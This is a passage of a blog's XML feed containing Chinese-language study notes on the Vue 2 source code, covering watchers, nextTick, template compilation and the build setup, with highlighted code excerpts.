punctuation">.</span>count <span class="token operator">+</span><span class="token operator">=</span> payload    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  actions<span class="token punctuation">:</span> <span class="token punctuation">{</span>    increateAsync <span class="token punctuation">(</span>context<span class="token punctuation">,</span> payload<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        context<span class="token punctuation">.</span><span class="token function">commit</span><span class="token punctuation">(</span><span class="token string">'increate'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vue源码学习（三）</title>
      <link href="2020/10/20/Vue-Vue%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89/"/>
      <url>2020/10/20/Vue-Vue%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<ul><li>Array.prototype.concat.apply</li><li>模板编译</li><li>简述 Vue 首次渲染过程</li><li>简述 Vue 首次模板编译过程</li></ul><h2 id="Array-prototype-concat-apply"><a href="#Array-prototype-concat-apply" class="headerlink" title="Array.prototype.concat.apply"></a>Array.prototype.concat.apply</h2><ul><li>如果<code>concat方法</code>的<code>参数</code>是一个元素，该元素会被直接插入到新数组中；如果参数是一个<code>数组</code>，<code>该数组的各个元素</code>将被插入到<code>新数组</code>中；将该特性应用到代码中完成数组降维</li></ul><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// vue 源码中的一段</span><span class="token keyword">function</span> simpleNormalizeChildren <span class="token punctuation">(</span>children<span class="token punctuation">:</span> any<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> children<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 如果第 i 项是数组则降维</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>children<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> Array<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>concat<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> children<span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> children<span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 测试</span><span class="token keyword">let</span> children <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">simpleNormalizeChildren</span><span class="token punctuation">(</span>children<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]</span></code></pre><h2 id="模板编译"><a href="#模板编译" class="headerlink" title="模板编译"></a>模板编译</h2><ul><li>模板编译的主要目的是将模板 (template) 转换为渲染函数 (render)</li></ul><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>handler<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>title<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>some content<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre><ul><li>渲染函数 render</li></ul><pre class=" language-js"><code class="language-js">render <span class="token punctuation">(</span>h<span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">return</span> <span class="token function">h</span><span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>         <span class="token function">h</span><span class="token punctuation">(</span><span class="token string">'h1'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> on<span class="token punctuation">:</span> <span class="token punctuation">{</span> click<span class="token punctuation">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>handler<span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">'title'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>         <span class="token function">h</span><span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'some content'</span><span class="token punctuation">)</span>     <span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">}</span></code></pre><ul><li><p>模板编译的作用</p><ul><li>Vue 2.x 使用 VNode 描述视图以及各种交互，用户自己编写 VNode 比较复杂</li><li>用户只需要编写类似 HTML 的代码 - Vue 模板，通过编译器将模板转换为返回 VNode 的 render 函数</li><li>.vue 文件会被 webpack 在构建的过程中转换成 render 函数（Vue-loader）</li></ul></li><li><p>在线编译</p><ul><li>vue2.xx版本在线编译:<a href="https://template-explorer.vuejs.org/#" target="_blank" rel="noopener">https://template-explorer.vuejs.org/#</a></li><li>vue3.xx版本在线编译:<a href="https://vue-next-template-explorer.netlify.app/#" target="_blank" rel="noopener">https://vue-next-template-explorer.netlify.app/#</a></li></ul></li></ul><h2 id="简述-Vue-首次渲染过程"><a href="#简述-Vue-首次渲染过程" class="headerlink" title="简述 Vue 首次渲染过程"></a>简述 Vue 首次渲染过程</h2><p>参考<a href="https://blog.csdn.net/sinat_35349493/article/details/107684898" target="_blank" rel="noopener">大前端学习-Vue首次渲染过程</a></p><h2 id="简述-Vue-首次模板编译过程"><a href="#简述-Vue-首次模板编译过程" class="headerlink" title="简述 Vue 首次模板编译过程"></a>简述 Vue 首次模板编译过程</h2><p>参考<a href="https://blog.csdn.net/weixin_40599109/article/details/107645458?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.add_param_isCf&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.add_param_isCf" target="_blank" rel="noopener">Vue 中模板的编译过程概述</a></p>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vue源码学习（二）</title>
      <link href="2020/10/16/Vue-Vue%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>2020/10/16/Vue-Vue%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<ul><li>watch的两个参数</li><li>三种类型的 Watcher 对象</li><li>异步更新队列-nextTick</li></ul><h2 id="watch的两个参数"><a href="#watch的两个参数" class="headerlink" title="watch的两个参数"></a>watch的两个参数</h2><ul><li>immediate：代表立即执行，而不是等监听对象改变再执行</li><li>deep：深度监听，对象的属性改变也可以监听的到</li></ul><p>可以参考<a href="https://zhuanlan.zhihu.com/p/86273758" target="_blank" rel="noopener">这篇文章</a></p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 两种写法</span>watch<span class="token punctuation">:</span> <span class="token punctuation">{</span>    <span class="token string">'user.firstName'</span><span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>newValue<span class="token punctuation">,</span> oldValue<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>user<span class="token punctuation">.</span>fullName <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>user<span class="token punctuation">.</span>firstName <span class="token operator">+</span> <span class="token string">''</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>user<span class="token punctuation">.</span>lastName    <span class="token punctuation">}</span><span class="token punctuation">}</span>watch<span class="token punctuation">:</span> <span class="token punctuation">{</span>    <span class="token string">'user'</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>        handler<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>newValue<span class="token punctuation">,</span> oldValue<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>user<span class="token punctuation">.</span>fullName <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>user<span class="token punctuation">.</span>firstName <span class="token operator">+</span> <span class="token string">''</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>user<span class="token punctuation">.</span>lastName        <span class="token punctuation">}</span><span class="token punctuation">,</span>        deep<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        immediate<span class="token punctuation">:</span> <span class="token boolean">true</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="三种类型的-Watcher-对象"><a href="#三种类型的-Watcher-对象" class="headerlink" title="三种类型的 Watcher 对象"></a>三种类型的 Watcher 对象</h2><ul><li><p>没有静态方法，因为 $watch 方法中要使用 Vue 的实例</p></li><li><p>Watcher 分三种：计算属性 Watcher、用户 Watcher (侦听器)、渲染 Watcher</p><ul><li>计算属性 Watcher 在 initComputd 中创建</li><li>用户 Watcher (侦听器) 在 Vue.$watch 中创建</li><li>渲染 Watcher 在 mountComponent 中创建</li></ul></li><li><p>Watcher内部实现是一样的，<code>src/core/observer/watcher.js</code>中，并且每一个Watcher都有一个id</p></li><li><p>创建顺序：计算属性 Watcher、用户 Watcher (侦听器)、渲染 Watcher</p></li><li><p>vm.$watch()</p><ul><li>src\core\instance\state.js</li></ul></li></ul><pre class=" language-js"><code class="language-js">Vue<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>$watch <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>    expOrFn<span class="token punctuation">:</span> string <span class="token operator">|</span> Function<span class="token punctuation">,</span>    cb<span class="token punctuation">:</span> any<span class="token punctuation">,</span>    options<span class="token operator">?</span><span class="token punctuation">:</span> Object  <span class="token punctuation">)</span><span class="token punctuation">:</span> Function <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 获取 Vue 实例 this</span>    <span class="token keyword">const</span> vm<span class="token punctuation">:</span> Component <span class="token operator">=</span> <span class="token keyword">this</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isPlainObject</span><span class="token punctuation">(</span>cb<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">// 判断如果 cb 是对象执行 createWatcher</span>      <span class="token keyword">return</span> <span class="token function">createWatcher</span><span class="token punctuation">(</span>vm<span class="token punctuation">,</span> expOrFn<span class="token punctuation">,</span> cb<span class="token punctuation">,</span> options<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    options <span class="token operator">=</span> options <span class="token operator">||</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    options<span class="token punctuation">.</span>user <span class="token operator">=</span> <span class="token boolean">true</span>    <span class="token comment" spellcheck="true">// 创建用户 watcher 对象</span>    <span class="token keyword">const</span> watcher <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Watcher</span><span class="token punctuation">(</span>vm<span class="token punctuation">,</span> expOrFn<span class="token punctuation">,</span> cb<span class="token punctuation">,</span> options<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// 判断 immediate 如果为 true</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>options<span class="token punctuation">.</span>immediate<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">// 立即执行一次 cb 回调，并且把当前值传入</span>      <span class="token keyword">try</span> <span class="token punctuation">{</span>        cb<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>vm<span class="token punctuation">,</span> watcher<span class="token punctuation">.</span>value<span class="token punctuation">)</span>      <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">handleError</span><span class="token punctuation">(</span>error<span class="token punctuation">,</span> vm<span class="token punctuation">,</span> <span class="token template-string"><span class="token string">`callback for immediate watcher "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>watcher<span class="token punctuation">.</span>expression<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">"`</span></span><span class="token punctuation">)</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 返回取消监听的方法</span>    <span class="token keyword">return</span> <span class="token keyword">function</span> unwatchFn <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      watcher<span class="token punctuation">.</span><span class="token function">teardown</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span></code></pre><h2 id="异步更新队列-nextTick"><a href="#异步更新队列-nextTick" class="headerlink" title="异步更新队列-nextTick"></a>异步更新队列-nextTick</h2><p>可以查看<a href="https://www.jianshu.com/p/7f9495b1c8ab" target="_blank" rel="noopener">Vue.nextTick 的原理和用途</a></p><ul><li><p>首先修改数据，在script代码块中，这是宏任务，同一事件循环的所有的宏任务都在主线程上执行，形成一个执行栈，此时还未涉及DOM.</p></li><li><p>Vue开启一个异步队列，并缓冲在此事件循环中发生的所有数据变化。如果同一个watcher被多次触发，只会被推入 queueWatcher 队列中一次，这种在缓冲时去除重复数据对于避免不必要的计算和 DOM 操作上非常重要</p></li></ul><h4 id="定义位置"><a href="#定义位置" class="headerlink" title="定义位置"></a>定义位置</h4><ul><li>src\core\instance\render.js</li></ul><pre class=" language-js"><code class="language-js">Vue<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>$nextTick <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>fn<span class="token punctuation">:</span> Function<span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">return</span> <span class="token function">nextTick</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token punctuation">}</span></code></pre><h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><ul><li>手动调用 vm.$nextTick()</li><li>在 Watcher 的 queueWatcher 中执行 nextTick()</li><li>src\core\util\next-tick.js</li></ul><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><ul><li><p>在修改完数据时，想要获取更新后 DOM 上最新数据，需要使用 nextTick，因为 DOM 的更新过程是异步的</p></li><li><p>nextTick 会把传入的回调函数 cb 压入 callbacks 数组，这里使用 callbacks 而不是直接在 nextTick 中执行回调函数的原因是保证在同一个 tick 内多次执行 nextTick时不会开启多个异步任务，而是把这些任务放在一起一同执行。</p></li><li><p>那么这些回调函数如何调用呢，nextTick 内部优先使用微任务执行异步的回调函数，microtask 因为其高优先级特性能确保队列中的微任务在一次事件循环前被执行完毕，如果浏览器不支持 Promise 的话会降级成 MutationObserver，如果浏览器再不支持微任务，会降级成宏任务，如果 IE 优先使用 setImmediate，否则使用 setTimeout</p></li><li><p>然后其实Vue进行 DOM 更新内部也是调用 nextTick 来做异步队列控制，而当我们自己调用 nextTick 时，更新 DOM 的回调函数已经加入了callback，在他后面后追加了我们自己的回调函数，从而确保我们的代码在 DOM 更新后执行，所以我们可以拿到更新后的 DOM</p></li><li><p>问题： 按照 macrotask =&gt; microtask =&gt; ui渲染的顺序，若 nextTick 在微任务队列中，此时ui还没渲染，那他是怎么拿到 DOM 的呢</p><ul><li><p>首先解释：其实macrotask =&gt; microtask =&gt; ui渲染的规则是为了 JS 引擎线程和 GUI 渲染线程有序切换</p></li><li><p>因为已经保证了我们的 nextTick 在更新 DOM 的 nextTick 之后，可以拿到，就是还没渲染而已</p></li></ul></li></ul><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 支持 Promise 使用 Promise</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> Promise <span class="token operator">!==</span> <span class="token string">'undefined'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isNative</span><span class="token punctuation">(</span>Promise<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> p <span class="token operator">=</span> Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  timerFunc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    p<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>flushCallbacks<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>isIOS<span class="token punctuation">)</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>noop<span class="token punctuation">)</span>  <span class="token punctuation">}</span>  isUsingMicroTask <span class="token operator">=</span> <span class="token boolean">true</span><span class="token comment" spellcheck="true">// 否则使用 MutationObserver</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>isIE <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> MutationObserver <span class="token operator">!==</span> <span class="token string">'undefined'</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>  <span class="token function">isNative</span><span class="token punctuation">(</span>MutationObserver<span class="token punctuation">)</span> <span class="token operator">||</span>  <span class="token comment" spellcheck="true">// PhantomJS and iOS 7.x</span>  MutationObserver<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'[object MutationObserverConstructor]'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Use MutationObserver where native Promise is not available,</span>  <span class="token comment" spellcheck="true">// e.g. PhantomJS, iOS7, Android 4.4</span>  <span class="token comment" spellcheck="true">// (#6466 MutationObserver is unreliable in IE11)</span>  <span class="token keyword">let</span> counter <span class="token operator">=</span> <span class="token number">1</span>  <span class="token keyword">const</span> observer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MutationObserver</span><span class="token punctuation">(</span>flushCallbacks<span class="token punctuation">)</span>  <span class="token keyword">const</span> textNode <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createTextNode</span><span class="token punctuation">(</span><span class="token function">String</span><span class="token punctuation">(</span>counter<span class="token punctuation">)</span><span class="token punctuation">)</span>  observer<span class="token punctuation">.</span><span class="token function">observe</span><span class="token punctuation">(</span>textNode<span class="token punctuation">,</span> <span class="token punctuation">{</span>    characterData<span class="token punctuation">:</span> <span class="token boolean">true</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span>  timerFunc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    counter <span class="token operator">=</span> <span class="token punctuation">(</span>counter <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2</span>    textNode<span class="token punctuation">.</span>data <span class="token operator">=</span> <span class="token function">String</span><span class="token punctuation">(</span>counter<span class="token punctuation">)</span>  <span class="token punctuation">}</span>  isUsingMicroTask <span class="token operator">=</span> <span class="token boolean">true</span><span class="token comment" spellcheck="true">// 否则使用 setImmediate</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> setImmediate <span class="token operator">!==</span> <span class="token string">'undefined'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isNative</span><span class="token punctuation">(</span>setImmediate<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Fallback to setImmediate.</span>  <span class="token comment" spellcheck="true">// Technically it leverages the (macro) task queue,</span>  <span class="token comment" spellcheck="true">// but it is still a better choice than setTimeout.</span>  timerFunc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token function">setImmediate</span><span class="token punctuation">(</span>flushCallbacks<span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 否则使用 setTimeout</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Fallback to setTimeout.</span>  timerFunc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span>flushCallbacks<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 如果有回调函数 cb 则加入一个队列，如果没有则返回 Promise，第二个参数是上下文</span><span class="token keyword">export</span> <span class="token keyword">function</span> nextTick <span class="token punctuation">(</span>cb<span class="token operator">?</span><span class="token punctuation">:</span> Function<span class="token punctuation">,</span> ctx<span class="token operator">?</span><span class="token punctuation">:</span> Object<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">let</span> _resolve  callbacks<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>cb<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">try</span> <span class="token punctuation">{</span>        cb<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span>      <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">handleError</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> ctx<span class="token punctuation">,</span> <span class="token string">'nextTick'</span><span class="token punctuation">)</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>_resolve<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">_resolve</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>pending<span class="token punctuation">)</span> <span class="token punctuation">{</span>    pending <span class="token operator">=</span> <span class="token boolean">true</span>    <span class="token function">timerFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 取出所有的回调函数调用</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// $flow-disable-line</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>cb <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> Promise <span class="token operator">!==</span> <span class="token string">'undefined'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span>resolve <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      _resolve <span class="token operator">=</span> resolve    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vue源码学习（一）</title>
      <link href="2020/10/13/Vue-Vue%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>2020/10/13/Vue-Vue%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<ul><li>调试与打包</li><li>template和render同时存在</li><li>平台无关与平台相关</li><li>Vue的构造函数</li><li>源码报错的两个小问题</li><li>Vue初始化-静态成员</li><li>Vue的实例属性和方法</li></ul><h2 id="调试与打包"><a href="#调试与打包" class="headerlink" title="调试与打包"></a>调试与打包</h2><ul><li>vue源码中的打包工具 Rollup<ul><li>Vue.js 源码的打包工具使用的是 Rollup，比 Webpack 轻量</li><li>Webpack 把所有文件当做模块，Rollup 只处理 js 文件更适合在 Vue.js 这样的库中使用</li><li>Rollup 打包不会生成冗余的代码</li></ul></li><li>安装依赖后设置 sourcemap</li></ul><pre class=" language-json"><code class="language-json"><span class="token property">"dev"</span><span class="token operator">:</span> <span class="token string">"rollup -w -c scripts/config.js --sourcemap --environment TARGET:web- full-dev"</span></code></pre><ul><li>执行<code>npm run dev</code>打包，发现<code>dist</code>目录下生成许多文件</li></ul><p>此处参考：<a href="https://cn.vuejs.org/v2/guide/installation.html#%E5%AF%B9%E4%B8%8D%E5%90%8C%E6%9E%84%E5%BB%BA%E7%89%88%E6%9C%AC%E7%9A%84%E8%A7%A3%E9%87%8A" target="_blank" rel="noopener">官方文档</a></p><ul><li><p>推荐使用运行时版本，因为运行时版本相比完整版体积要小大约 30%</p></li><li><p>基于 Vue-CLI 创建的项目默认使用的是 vue.runtime.esm.js</p></li><li><p>*.vue 文件中的模板是在构建时预编译的，最终打包后的结果不需要编译器，只需要运行</p><p>时版本即可</p></li></ul><h2 id="通过看源码解决问题"><a href="#通过看源码解决问题" class="headerlink" title="通过看源码解决问题"></a>通过看源码解决问题</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>     el<span class="token punctuation">:</span> <span class="token string">'#app'</span><span class="token punctuation">,</span>     template<span class="token punctuation">:</span> <span class="token string">'&lt;h3>Hello template&lt;/h3>'</span><span class="token punctuation">,</span>     render <span class="token punctuation">(</span>h<span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">return</span> <span class="token function">h</span><span class="token punctuation">(</span><span class="token string">'h4'</span><span class="token punctuation">,</span> <span class="token string">'Hello render'</span><span class="token punctuation">)</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 同时存在template和render函数时页面输出 Hello render</span></code></pre><ul><li>el 不能是 body 或者 html 标签</li><li>如果没有 render，把 template 转换成 render 函数</li><li>如果有 render 方法，直接调用 mount 挂载 DOM</li></ul><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 1. el 不能是 body 或者 html </span><span class="token keyword">if</span> <span class="token punctuation">(</span>el <span class="token operator">===</span> document<span class="token punctuation">.</span>body <span class="token operator">||</span> el <span class="token operator">===</span> document<span class="token punctuation">.</span>documentElement<span class="token punctuation">)</span> <span class="token punctuation">{</span>     process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>NODE_ENV <span class="token operator">!==</span> <span class="token string">'production'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">warn</span><span class="token punctuation">(</span>         <span class="token template-string"><span class="token string">`Do not mount Vue to &lt;html> or &lt;body> - mount to normal elements instead.`</span></span>     <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token keyword">this</span> <span class="token punctuation">}</span><span class="token keyword">const</span> options <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>$options <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>options<span class="token punctuation">.</span>render<span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token comment" spellcheck="true">// 2. 把 template/el 转换成 render 函数 </span>    …… <span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 3. 调用 mount 方法，挂载 DOM </span><span class="token keyword">return</span> mount<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> el<span class="token punctuation">,</span> hydrating<span class="token punctuation">)</span></code></pre><h2 id="平台无关与平台相关"><a 